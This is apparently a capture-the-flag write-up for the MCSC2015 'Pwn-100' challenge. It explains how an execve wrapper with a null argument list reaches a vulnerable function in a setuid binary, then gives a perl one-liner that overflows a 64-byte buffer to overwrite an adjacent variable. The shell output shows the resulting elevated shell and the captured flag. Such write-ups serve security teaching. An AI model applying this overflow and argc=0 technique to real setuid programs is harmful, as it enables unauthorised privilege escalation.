#MCSC2015 writeup for Pwn-100<br>

```
pwn0@MCSC2015:/challenges/pwn0$ ls -l
total 16
-rws--s--x 1 pwned0 pwned0 7492 mai   18 15:13 0
-r-------- 1 pwned0 pwned0   52 mai   18 15:13 FLAG
-rw-r--r-- 1 root   root    558 mai   18 15:13 pwn0.c
pwn1@MCSC2015:/challenges/pwn0$ /tmp/checksec.sh --file 0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   0
pwn0@MCSC2015:/challenges/pwn0$ cat /proc/sys/kernel/randomize_va_space
2
```
checksec.sh cant be found at : https://github.com/slimm609/checksec.sh/blob/master/checksec <br>
There's no canary, NX is disabled, nothing but good news<br>
ASLR is on !!<br>
Having the options used when compiling the binary, we can get to the same conclusion ...<br>
gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o 0.c<br>
-mpreferred-stack-boundary=2 ( pointers inside the  stack are on 4-byte boundary )  :) <br>
after a quick view in pwn0.c, here's an interesting function<br>
<br>
```C
void vuln()
{
	unsigned int reg;
	char buffer[BUFF_SIZE];
	fgets(buffer , BUFF_SIZE+5 , stdin);
	if(reg == 78954)
	{
		printf("You Win\n");
		system("/bin/dash");
	}
}
```
However, this function is executed if and only if argc is equal to zero.<br>
In that case, execve can be handy ...<br>
<br>
<br>
Step 1 : run the program with argc equals to zero to allow the function vuln() to be executed.<br>
Step 2 : overwrite the variable reg with 78954<br>
``````
if(reg == 78954)
{
	printf("You Win\n");
	system("/bin/dash");
}
```

Step1 : run a program with argc=0<br>
What's special about the family exec call system ?<br>
execve allows you to specify the command-line arguments (including the program name).<br>
a normal call to execve for example would be :<br>
execve("/home/xxx/prog","prog",NULL) witch is similar to /home/xxx/prog with argc equals to 1 as usual ....<br>
execve("/home/xxx/prog",NULL,NULL) would be a little bit different .... argc is equal to zero in that case.<br>
<br>
with that said, let's start exploiting .....<br>
First, we write a small program <br>
\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>

```C
#include <stdio.h>
#include <stdlib.h>
int main()
{
	execve("/challenges/pwn0/0",NULL,NULL);
}
```
\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
```
pwn0@MCSC2015:/tmp$ mkdir /tmp/testing
pwn0@MCSC2015:/tmp$ cd /tmp/testing/
pwn0@MCSC2015:/tmp/testing$ cat wrapper.c
```
```C
#include <stdio.h>
#include <stdlib.h>
int main()
{
	execve("/challenges/pwn0/0",NULL,NULL);
}
```
```
pwn0@MCSC2015:/tmp/testing$ gcc wrapper.c -o wrapper
pwn0@MCSC2015:/tmp/testing$ ./wrapper
Good Boy
test
pwn0@MCSC2015:/tmp/testing$
```
we are finally able to execute the vuln() function, let's try to exploit it:<br>
The buffer size is 64, 78954 to hexadecimal is 0x1346A<br>
===========================<br>
A successful exploitation would be like this:<br>
pwn0@MCSC2015:/challenges/pwn0$ perl -e 'print "A"x64 . "\x6a\x34\x01\x00"' > /tmp/testing/input<br>
pwn0@MCSC2015:/challenges/pwn0$ cat /tmp/testing/input -|/tmp/testing/wrapper <br>
Good Boy<br>
You Win<br>
id<br>
uid=1001(pwn0) gid=1001(pwn0) euid=1002(pwned0) egid=1002(pwned0) groups=1002(pwned0),1001(pwn0)<br>
cat FLAG<br>
flaG{I_4M_Th3_EaSy_One_Pwn_th3_N3xt_L3vel_If_U_C4N}<br>
<br>
